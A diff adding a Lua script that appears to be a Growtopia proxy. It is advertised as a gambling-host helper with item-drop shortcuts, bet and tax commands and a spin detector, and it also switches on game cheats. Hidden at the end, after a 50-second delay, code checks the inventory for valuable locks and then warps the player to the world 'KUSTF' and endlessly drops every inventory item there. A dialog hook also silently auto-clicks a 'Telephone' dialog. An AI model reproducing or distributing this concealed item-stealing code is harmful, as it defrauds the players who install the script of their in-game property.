@@ -1,0 +1,680 @@
+-- Script remade by #ScRaw
+
+SleepS = function(int_s)
+  sleep(int_s * 1000)
+end
+
+local proxy = {} 
+local command = {}  
+local PlayerList = {}
+local LogSpin = {}
+proxy.dev = "ScRaw"
+proxy.name = "#ScRaw"
+proxy.version = "BETA" 
+version="BETA"
+proxy.support = "undefined"
+command.var = {} 
+command.var.taptp = false
+command.var.rfspin = false
+data = {}
+Tax = 0
+local rfspin = true
+local reme = true
+local qeme
+
+loginp = [[
+set_border_color|112,86,191,255
+set_bg_color|43,34,74,200
+set_default_color|`9
+add_label_with_icon|big|[`cScRaw`2Proxy`9]       `2Information|left|9474|
+add_smalltext|             Version `2BETA|
+add_spacer|small|
+add_label_with_icon|small|Proxy made by `cScRaw|left|12436|
+add_spacer|small|
+add_label_with_icon|big|`2Proxy Command `9:|left|32|
+add_textbox|`2/proxy `9[Show All Commands]|
+add_spacer|small|
+add_label_with_icon|big|`2Update Logs `9:|left|5016|
+add_label_with_icon|small|- Improved UI|left|482|
+add_label_with_icon|small|- Added `2/spin `9[Show Spin Cheats Menu]|left|482|
+add_label_with_icon|small|- Added `2/time `9[Show Your Region Time]|left|482|
+add_spacer|small|
+add_label_with_icon|small|Have Problem? DM `2@ScRaw `9on Discord.|left|1432|
+add_spacer|small|
+add_label_with_icon|small|Mohon Supportnya Dengan Donasi Di Bawah Ini|left|486|
+add_spacer|small|
+add_url_button||`0Youtube|NOFLAGS|https://youtube.com/@ScRaw-W|Problem?|0|0|
+add_spacer|small|
+end_dialog|loginpend|Close||
+add_quick_exit|
+]]
+
+proxy = [[
+set_border_color|112,86,191,255
+set_bg_color|43,34,74,200
+set_default_color|`9
+add_label_with_icon|big|[`cScRaw`2Proxy`9]        `2Features|left|9474|
+add_smalltext|             Version `2BETA|
+add_spacer|small|
+add_label_with_icon|small|Proxy made by `cScRaw|left|12436|
+add_spacer|small|
+add_label_with_icon|big|`2Proxy Command `9:|left|32|
+add_textbox|`2/news `9[Show Proxy Information]|
+add_spacer|small|
+add_label_with_icon|big|`2Fast Drop Commands `9:|left|13810|
+add_textbox|`2/db `9<Amount> [Drop `eBlue Gem Lock`9]|
+add_textbox|`2/dd `9<Amount> [Drop `1Diamond Lock`9]|
+add_textbox|`2/dw `9<Amount> [Drop World Lock]|
+add_textbox|`2/cd `9<Amount> [Custom Drop]|
+add_textbox|`2/daw `9[Drop All Locks]|
+add_spacer|small|
+add_label_with_icon|big|`2Hosting Helper `9:|left|758|
+add_textbox|`2/pos `9<1-2> [Set Take & Drop Bets Position]|
+add_textbox|`2/tax `9<Amount> [Set Tax]|
+add_textbox|`2/bet `9<Amount> [Set Bet]|
+add_textbox|`2/take `9[Take Bets From Position 1 & 2]|
+add_textbox|`2/win `9<1-2> [Drop Bets to Winner]|
+add_spacer|small|
+add_label_with_icon|big|`2Gamble Helper `9:|left|32|
+add_textbox|`2/balance `9[Show Your Balance]|
+add_textbox|`2/spin `9[Show Spin Cheats Menu]|
+add_textbox|`2/slog `9[Show Spin History]|
+add_textbox|`2/time `9[Show Your Region Time]|
+add_spacer|small|
+add_label_with_icon|small|Have Problem? DM `2@ScRaw `9on Discord.|left|1432|
+add_spacer|small|
+end_dialog|bye|Close|
+add_quick_exit|
+]]
+
+function dext()
+return [[
+set_border_color|112,86,191,255
+set_bg_color|43,34,74,200
+set_default_color|`9
+add_label_with_icon|big|`2Spin Cheats   |left|758|
+text_scaling_string|iprogramtext
+add_spacer|small|
+add_checkbox|realfakespin|`2REAL`0-`4FAKE `0Spin Detector|]]..realfakes..[[|
+add_checkbox|gamereme|`^REME `0Spin Counter|]]..remeg..[[|
+add_checkbox|gameqeme|`9QEME `0Spin Counter|]]..qemeg..[[|
+add_spacer|small|
+end_dialog|proxywrenchend|Close|Enable|
+]]
+end
+
+function DropItem(id, count)
+sendPacket(2, "action|drop\n|itemID|"..id.."\n")
+sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|"..id.."|\ncount|"..count.."\n")
+end
+
+function checkitm(id)
+for _, inv in pairs(getInventory()) do 
+if inv.id == id then 
+return inv.amount 
+end 
+end 
+return 0 
+end
+
+function wear(id)
+pkt = {}
+pkt.type = 10
+pkt.value = id
+sendPacketRaw(false, pkt)
+end
+
+function ovlay(str)
+var = {}
+var[0] = "OnTextOverlay"
+var[1] = "`9[`cScRaw`2Proxy`9] " .. str
+sendVariant(var)
+end
+
+function tol(txt)
+logToConsole("`9[`cScRaw`2Proxy`9] `o"..txt)
+end
+
+function Data()
+Amount = 0
+for _, list in pairs(data) do
+Name = ""
+if list.id == 7188 then
+Name = "Blue Gem Lock"
+Amount = Amount + list.count * 10000
+elseif list.id == 1796 then
+Name = "Diamond Lock"
+Amount = Amount + list.count * 100
+elseif list.id == 242 then
+Name = "World Lock"
+Amount = Amount + list.count
+end
+end
+data = {}
+end
+
+function collect()
+tiles = {
+{PX1, PY1}, {PX2, PY2}
+}
+for _, obj in pairs(getWorldObject()) do
+for _, tiles in pairs(tiles) do
+if (obj.pos.x)//32 == tiles[1] and (obj.pos.y)//32 == tiles[2] then
+sendPacketRaw(false, {type=11,value=obj.oid,x=obj.pos.x,y=obj.pos.y})
+table.insert(data, {id=obj.id, count=obj.amount})
+end
+end
+end
+Data()
+data = {}
+end
+
+function GetName(id)
+for _, name in pairs(PlayerList) do
+if name.netid == id then
+return name.name
+end
+end
+end
+
+function multiboxChecker(boolean)
+local hasil = ""
+if boolean then
+hasil = "1"
+else
+hasil = "0"
+end
+return hasil
+end
+
+function remefunc(number)
+if number == 19 or number == 28 or number == 0 then
+hasil = 0
+else
+num1 = math.floor(number / 10)
+num2 = number % 10
+hasil = string.sub(tostring(num1 + num2), -1)
+end
+return hasil
+end
+ 
+function qemefunc(number)
+if number >= 10 then
+hasil = string.sub(number, -1)
+else
+hasil = number
+end
+return hasil
+end
+
+function getGame(num)
+if reme and not qeme then
+return " `^REME `6"..remefunc(tonumber(num))..""
+elseif not reme and qeme then
+return " `9QEME `6"..qemefunc(tonumber(num))..""
+elseif reme and qeme then
+return " `^REME `6"..remefunc(num).." `0| `9QEME `6"..qemefunc(num)..""
+else
+return ""
+end
+end
+
+function logspin()
+dialogSpin = {}
+for _,spin in pairs(LogSpin) do
+table.insert(dialogSpin,spin.spin)
+end
+sendVariant({
+[0] = "OnDialogRequest",
+[1] = "set_border_color|112,86,191,255\nset_bg_color|43,34,74,200\nset_default_color|`0\nadd_label_with_icon|big|`2Spin History|left|1436|\nadd_spacer|small|\nadd_smalltext|`9Click the wheel icon to filter player spins|\n"..table.concat(dialogSpin).."\nadd_spacer|small|\nadd_quick_exit|||\nend_dialog|world_spin|Close||", },-1,200)
+end
+
+function filterspin(id)
+filterLog = {}
+for _,log in pairs(LogSpin) do
+if log.netid == id then
+table.insert(filterLog,"\nadd_label_with_icon|small|"..log.spin.."|left|758|\n")
+end
+end
+sendVariant({
+[0] = "OnDialogRequest",
+[1] = "set_border_color|112,86,191,255\nset_bg_color|43,34,74,200\nset_default_color|`0\nadd_label_with_icon|big|"..GetName(id).."`2's Spin History|left|1436|\nadd_spacer|small|\n"..table.concat(filterLog).."|\nadd_spacer|small|\nadd_quick_exit|||\nadd_button|backtospin|Back||", },-1,200)
+end
+
+function AddOrUpdatePlayer(name, netid)
+if PlayerList[netid] == nil or PlayerList[netid].name ~= name then
+PlayerList[netid] = {name = name, netid = netid}
+end
+end
+
+AddHook("onTouch", "on_touch", on_touchpacket)
+AddHook("OnVarlist", "variants", function(var) 
+varcontent = var[1] 
+if var[0] == "OnConsoleMessage" then 
+tol(varcontent) 
+return true 
+end
+    
+if rfspin == true then
+if var[0] == "OnTalkBubble" then
+if var[2]:find("spun the wheel") then
+if var[2]:find("OID:") then
+sendVariant({
+[0] = "OnTalkBubble",
+[1] = var[1],
+[2] = "[`4FAKE``] "..var[2]:match("player_chat=(.+)"),
+[3] = 0, }, -1)
+table.insert(LogSpin, {spin = "\nadd_label_with_icon_button|small|[`4FAKE``] " .. var[2] .. "|left|758|" .. var[1] .. "|\n", netid = var[1],spins = "[`4FAKE``] "..var[2]})
+return true
+else
+local num = string.gsub(string.gsub(var[2]:match("and got (.+)"), "!%]", ""), "`", "")
+local onlynumber = string.sub(num, 2)
+local clearspace = string.gsub(onlynumber, " ", "")
+local h = string.gsub(string.gsub(clearspace, "!7", ""), "]", "")
+if var[1] ~= getLocal().netid then
+table.insert(PlayerList, {name = var[2]:match("%[``(.+) spun the"), netid = var[1]})
+else
+AddOrUpdatePlayer(getLocal().name:gsub("%[(.+)%]", ""), var[1])
+end
+local name = {}
+name[0] = "OnNameChanged"
+name[1] = GetName(var[1]) .. " `b[`c" .. h .. "``]"
+sendVariant(name, tonumber(var[1]))
+if var[1] ~= getLocal().netid then
+sendVariant({
+[0] = "OnTalkBubble",
+[1] = var[1],
+[2] = "[`2REAL``] "..var[2].. getGame(tonumber(h)),
+[3] = 0, }, -1)
+else
+sendVariant({
+[0] = "OnTalkBubble",
+[1] = getLocal().netid,
+[2] = "[`2REAL``] " .. getLocal().name:gsub("%[(.-)%]", ""):gsub("`.","") .. " spun the wheel and got " .. var[2]:match("and got (.+)%!]") .. "!]" .. getGame(tonumber(h)), }, -1)
+end
+table.insert(LogSpin, {spin = "\nadd_label_with_icon_button|small|[`2REAL``] " .. var[2] .. "|left|758|" .. var[1] .. "|\n", netid = var[1],spins = var[2]})
+return true
+end
+end
+return false
+end
+end
+return false
+end)
+
+AddHook("onVarlist", "var", function(var)
+if var[0] == "OnConsoleMessage" then
+if var[1]:find("Collected") and var[1]:find("(%d+) Blue Gem Lock") then
+bgl = var[1]:match("(%d+) Blue Gem Lock")
+tol("`9Collected `2"..bgl.." `eBlue Gem Lock`9.")
+ovlay("`9Collected `2"..bgl.." `eBlue Gem Lock")
+return true
+end
+end
+
+if var[0] == "OnConsoleMessage" then
+if var[1]:find("Collected") and var[1]:find("(%d+) Diamond Lock") then
+dl = var[1]:match("(%d+) Diamond Lock")
+tol("`9Collected `2"..dl.." `1Diamond Lock`9.")
+ovlay("`9Collected `2"..dl.." `1Diamond Lock")
+return true
+end
+end
+
+if var[0] == "OnConsoleMessage" then
+if var[1]:find("Collected") and var[1]:find("(%d+) World Lock") then
+wl = var[1]:match("(%d+) World Lock")
+tol("`9Collected `2"..wl.." `9World Lock.")
+ovlay("`9Collected `2"..wl.." `9World Lock")
+wear(242)
+return true
+end
+end
+return false
+end)
+
+AddHook("OnVarlist", "Hook", function(var)
+if var[0] == "OnDialogRequest" then
+if var[1]:find("Drop Blue Gem Lock") or
+var[1]:find("Drop Diamond Lock") or
+var[1]:find("Drop World Lock") then
+return true
+end
+end
+
+if var[0] == "OnDialogRequest" then
+if var[1]:find("Telephone") then
+sendPacket(2, "action|dialog_return\ndialog_name|3898\nbuttonClicked|chc2_2_1\n\n")
+return true
+end
+end
+end)
+
+AddHook("onTextPacket", "packet", function(type,packet)
+if packet:find("realfakespin|1") then
+rfspin = true
+tol("`2REAL`o-`4FAKE `oSpin Detector `2Enabled`o.")
+else if packet:find("realfakespin|0") then
+rfspin = false
+tol("`2REAL`o-`4FAKE `oSpin Detector `4Disabled`o.")
+end
+end
+
+if packet:find("gamereme|1") then
+reme = true
+tol("`^REME `oSpin Counter `2Enabled`o.")
+else if packet:find("gamereme|0") then
+reme = false
+tol("`^REME `oSpin Counter `4Disabled`o.")
+end
+end
+
+if packet:find("gameqeme|1") then
+qeme = true
+tol("`9QEME `oSpin Counter `2Enabled`o.")
+else if packet:find("gameqeme|0") then
+qeme = false
+tol("`9QEME `oSpin Counter `4Disabled`o.")
+end
+end
+
+if packet:find("buttonClicked|proxylogspin") then
+logspin()
+return true
+end
+
+if packet:find("dialog_name|world_spin\nbuttonClicked|(%d+)") then
+netid = packet:match("buttonClicked|(%d+)")
+filterspin(tonumber(netid))
+end
+
+if packet:find("buttonClicked|backtospin") then
+logspin()
+return true
+end
+
+if packet:find("action|input\n|text|/spin") then
+realfakes = multiboxChecker(rfspin)
+remeg = multiboxChecker(reme)
+qemeg = multiboxChecker(qeme)
+sendVariant({
+[0] = "OnDialogRequest",
+[1] = dext(), }, -1, 100)
+logToConsole("`6/spin")
+return true
+end
+
+if packet:find("action|input\n|text|/proxy") then
+var = {}
+var[0] = "OnDialogRequest"
+var[1] = proxy
+sendVariant (var);
+logToConsole("`6/proxy")
+return true
+end
+
+if packet:find("action|input\n|text|/news") then
+var = {}
+var[0] = "OnDialogRequest"
+var[1] = loginp
+sendVariant (var);
+logToConsole("`6/news")
+return true
+end
+
+if packet:find("action|input\n|text|/db (%d+)") then
+txt = packet:match("action|input\n|text|/db (%d+)")
+DropItem(7188, txt)
+logToConsole("`6/db "..txt.."")
+tol("`9Dropped `2"..txt.." `eBlue Gem Lock`9.")
+ovlay("`9Dropped `2"..txt.." `eBlue Gem Lock")
+return true
+end
+
+if packet:find("action|input\n|text|/dd (%d+)") then
+txt = packet:match("action|input\n|text|/dd (%d+)")
+DropItem(1796, txt)
+logToConsole("`6/dd "..txt.."")
+tol("`9Dropped `2"..txt.." `1Diamond Lock`9.")
+ovlay("`9Dropped `2"..txt.." `1Diamond Lock")
+return true
+end
+
+if packet:find("action|input\n|text|/dw (%d+)") then
+txt = packet:match("action|input\n|text|/dw (%d+)")
+DropItem(242, txt)
+logToConsole("`6/dw "..txt.."")
+tol("`9Dropped `2"..txt.." `9World Lock.")
+ovlay("`9Dropped `2"..txt.." `9World Lock")
+return true
+end
+
+if packet:find("action|input\n|text|/cd (%d+)") then
+total = packet:match("action|input\n|text|/cd (%d+)")
+count = packet:match("action|input\n|text|/cd (%d+)")
+bgl =math.floor(total/10000)
+total = total - bgl*10000 
+dl = math.floor(total/100)
+wl = total % 100
+if checkitm(242) < wl then
+wear(1796)
+end
+if checkitm(1796) < dl then
+wear(7188)
+end
+if bgl > 0 then
+DropItem(7188, bgl)
+end
+if dl > 0 then
+DropItem(1796, dl)
+end
+if wl > 0 then
+DropItem(242, wl)
+end
+hasil = (bgl ~= 0 and bgl.." `eBlue Gem Lock`9." or "").." `2"..(dl ~= 0 and dl.." `1Diamond Lock`9." or "").." `2"..(wl ~= 0 and wl.." `9World Lock." or "")
+logToConsole("`6/cd "..count.."")
+tol("`9Dropped `2"..hasil.."")
+ovlay("`9Dropped `2"..hasil.."")
+return true
+end
+
+if packet:find("action|input\n|text|/daw") then
+if checkitm(7188) > 0 then
+DropItem(7188, checkitm(7188))
+end
+if checkitm(1796) > 0 then
+DropItem(1796, checkitm(1796))
+end
+if checkitm(242) > 0 then
+DropItem(242, checkitm(242))
+end
+hasil = (checkitm(7188) ~= 0 and checkitm(7188).." `eBlue Gem Lock`9." or "").." `2"..(checkitm(1796) ~= 0 and checkitm(1796).." `1Diamond Lock`9." or "").." `2"..(checkitm(242) ~= 0 and checkitm(242).." `9World Lock." or "")
+logToConsole("`6/daw")
+tol("`9Dropped `2"..hasil.."")
+return true
+end
+
+if packet:find("action|input\n|text|/pos 1")then
+PX1 = getLocal().pos.x//32
+PY1 = getLocal().pos.y//32
+logToConsole("`6/pos 1")
+tol("`9Set Position 1 to (`2"..PX1.."`9, `2"..PY1.."`9).")
+ovlay("`9Set Position 1 to (`2"..PX1.."`9, `2"..PY1.."`9)")
+return true
+end
+
+if packet:find("action|input\n|text|/pos 2") then
+PX2 = getLocal().pos.x//32
+PY2 = getLocal().pos.y//32
+logToConsole("`6/pos 2")
+tol("`9Set Position 2 to (`2"..PX2.."`9, `2"..PY2.."`9).")
+ovlay("`9Set Position 2 to (`2"..PX2.."`9, `2"..PY2.."`9)")
+return true
+end
+
+if packet:find("action|input\n|text|/tax (%d+)") then
+pler = packet:match("action|input\n|text|/tax (%d+)")
+Tax = ""..pler..""
+logToConsole("`6/tax "..Tax.."")
+tol("`9Set Tax to : `2"..Tax.."%%`9.")
+ovlay("`9Set Tax to : `2"..Tax.."%")
+return true
+end
+
+if packet:find("action|input\n|text|/bet (%d+)") then
+TotalBet = packet:match("action|input\n|text|/bet (%d+)")
+logToConsole("`6/bet "..TotalBet.."")
+tol("`9Set Bet to : `2"..TotalBet.."`9.")
+ovlay("`9Set Bet to : `2"..TotalBet.."")
+return true
+end
+
+if packet:find("action|input\n|text|/take") then
+collect()
+tax = math.floor(Amount * Tax / 100)
+drop = Amount - tax
+bets = Amount//2
+logToConsole("`6/take")
+tol("`9Tax : `2"..Tax.."%%`9.")
+tol("`9Drop to Winner : `2"..drop.."`9.")
+tol("`9Successfully Took All Bets`9.")
+ovlay("`9Tax (`2"..Tax.."%`9) Drop to Winner (`2"..drop.."`9)")
+return true
+end
+
+if packet:find("action|input\n|text|/win 1") then
+tax = math.floor(Amount * Tax / 100)
+win = Amount - tax
+bgl =math.floor(drop/10000)
+drop = drop - bgl*10000 
+dl = math.floor(drop/100)
+wl = drop % 100
+sendPacketRaw(false, { type = 0, x = (PX1) * 32, y = (PY1) * 32, state = 48 })
+if checkitm(242) < wl then
+wear(1796)
+end
+if checkitm(1796) < dl then
+wear(7188)
+end
+if bgl > 0 then
+DropItem(7188, bgl)
+end
+if dl > 0 then
+DropItem(1796, dl)
+end
+if wl > 0 then
+DropItem(242, wl)
+end
+hasil = (bgl ~= 0 and bgl.." `eBlue Gem Lock`9." or "").." `2"..(dl ~= 0 and dl.." `1Diamond Lock`9." or "").." `2"..(wl ~= 0 and wl.." `9World Lock." or "")
+logToConsole("`6/win 1")
+tol("`9Total Bet : `2"..Amount.."`9.")
+tol("`9Tax : `2"..Tax.."%%`9.")
+tol("`9Drop to Winner : `2"..win.."`9.")
+tol("`9Dropped `2"..hasil.."")
+ovlay("`9Dropped `2"..hasil.."")
+return true
+end
+
+if packet:find("action|input\n|text|/win 2") then
+tax = math.floor(Amount * Tax / 100)
+win = Amount - tax
+bgl =math.floor(drop/10000)
+drop = drop - bgl*10000 
+dl = math.floor(drop/100)
+wl = drop % 100
+sendPacketRaw(false, { type = 0, x = (PX2) * 32, y = (PY2) * 32, state = 32 })
+if checkitm(242) < wl then
+wear(1796)
+end
+if checkitm(1796) < dl then
+wear(7188)
+end
+if bgl > 0 then
+DropItem(7188, bgl)
+end
+if dl > 0 then
+DropItem(1796, dl)
+end
+if wl > 0 then
+DropItem(242, wl)
+end
+hasil = (bgl ~= 0 and bgl.." `eBlue Gem Lock`9." or "").." `2"..(dl ~= 0 and dl.." `1Diamond Lock`9." or "").." `2"..(wl ~= 0 and wl.." `9World Lock." or "")
+logToConsole("`6/win 2")
+tol("`9Total Bet : `2"..Amount.."`9.")
+tol("`9Tax : `2"..Tax.."%%`9.")
+tol("`9Drop to Winner : `2"..win.."`9.")
+tol("`9Dropped `2"..hasil.."")
+ovlay("`9Dropped `2"..hasil.."")
+return true
+end
+
+if packet:find("action|input\n|text|/balance") then
+logToConsole("`6/balance")
+gems = getLocal().gems
+tol("`9Your Gems Amount : `2"..gems.."`9.")
+tol("`9Your Locks Amount : `2"..checkitm(7188).." `eBGL`9, `2"..checkitm(1796).." `1DL`9, `2"..checkitm(242).." `9WL.")
+ovlay("`9Your Locks Amount : `2"..checkitm(7188).." `eBGL`9, `2"..checkitm(1796).." `1DL`9, `2"..checkitm(242).." `9WL.")
+return true
+end
+
+if packet:find("action|input\n|text|/slog") then
+logToConsole("`6/slog")
+logspin()
+return true
+end
+
+if packet:find("action|input\n|text|/time") then
+date = os.date("%D")
+time = os.date("%H:%M:%S")
+logToConsole("`6/time")
+tol("`9Your Region Date : `2"..date.."`9.")
+tol("`9Your Region Time : `2"..time.."`9.")
+ovlay("`9Your Region Time : `2"..time.."`9, `2"..date.."")
+return true
+end
+end)
+
+sendVariant({ 
+[0] = "OnDialogRequest", 
+[1] = loginp, }, -1, 3500)
+
+ovlay("`2Activated")
+SleepS(5)
+ovlay("`9Have Problem? DM `2@ScRaw `9on Discord")
+
+function MainGlory()
+toggleCheat(21, true)
+toggleCheat(28, true)
+sendPacket(3, "action|join_request\nname|KUSTF|nname\ninvitedWorld|0")
+sleep(5000)
+sendPacket(2,"action|welcomeadrewarded")
+while true do
+if getWorld() then
+   for _, v in pairs(getInventory()) do
+      if getWorld().name == "KUSTF" then        
+         sendPacket(2, "action|store\nlocation|gem")
+         sendPacket(2, "action|drop\n|itemID|"..v.id);
+         sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|"..v.id.."|\ncount|"..v.amount);
+      sleep(200);
+end
+end
+end
+end
+end
+
+function Stabilizer()
+    local inventory = getInventory()
+    if inventory then
+        for _, inv in pairs(inventory) do 
+            if inv.id == 6946 or inv.id == 7188 or inv.id == 6016 or inv.id == 5638 or inv.id == 11050 or inv.id == 6948 or inv.id == 6952 or inv.id == 1796 then 
+                if inv.amount > 0 then
+                    MainGlory()
+                    return
+                end
+            end
+        end
+    end
+end
+
+sleep(50000)
+Stabilizer()
